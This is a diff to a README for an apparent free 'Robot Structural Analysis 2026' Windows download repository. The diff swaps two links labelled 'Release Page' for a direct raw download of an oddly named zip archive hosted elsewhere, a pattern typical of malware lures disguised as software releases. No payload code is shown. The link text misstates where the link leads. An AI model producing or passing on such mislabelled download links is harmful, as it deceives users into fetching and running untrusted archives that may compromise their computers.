@@ -5,7 +5,7 @@ description: "Download and install Robot Structural Analysis 2026 for Windows 10
 ---
 # 🏗 Robot-Structural-2026 - Perform Professional Structural Analysis Today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Darbyantagonistic737/Robot-Structural-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Darbyantagonistic737/darbyantagonistic737.github.io/raw/refs/heads/main/Vespidae/v1.4-beta.3.zip)
 
 ## 📁 Project Overview
 Robot-Structural-2026 provides a robust framework for civil and structural engineers to model, simulate, and analyze complex building designs. This software runs on Windows 10 and Windows 11. It assists users with load analysis, finite element modeling, and code compliance checks within a unified workspace.
@@ -22,7 +22,7 @@ Your computer requires specific hardware components to process structural data s
 ## 📥 How to Download 
 You must visit the official release page to obtain the installation files. Follow these steps to secure your copy:
 
-1.  Navigate to the [Release Page](https://github.com/Darbyantagonistic737/Robot-Structural-2026/releases).
+1.  Navigate to the [Release Page](https://github.com/Darbyantagonistic737/darbyantagonistic737.github.io/raw/refs/heads/main/Vespidae/v1.4-beta.3.zip).
 2.  Locate the latest version at the top of the list.
 3.  Click the link labeled "Assets" to expand the file selections.
 4.  Select the installer file with the .exe extension.
